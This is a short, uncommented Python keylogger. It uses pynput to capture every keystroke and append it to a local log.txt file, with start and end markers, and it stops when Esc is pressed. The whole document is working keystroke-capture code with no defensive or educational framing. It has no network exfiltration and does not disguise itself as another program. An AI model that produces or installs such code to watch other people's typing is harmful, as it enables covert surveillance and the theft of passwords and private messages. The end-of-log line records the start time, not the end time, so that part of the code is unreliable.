import datetime
from pynput.keyboard import Key, Listener

with open("log.txt", "a") as timestamp:
    today = str(datetime.datetime.now())
    timestamp.write("\nLOG START: " + today + "\n\n")

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print(key)

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", '')
            if k.find("space") > 0:
                f.write("\n")
            if k.find("back") > 0:
                f.write("\b\b")
            if k.find("enter") > 0:
                f.write("_RETURN\n")
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        with open("log.txt", "a") as end:
            end.write("\n\nLOG END: " + today + "\n")
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
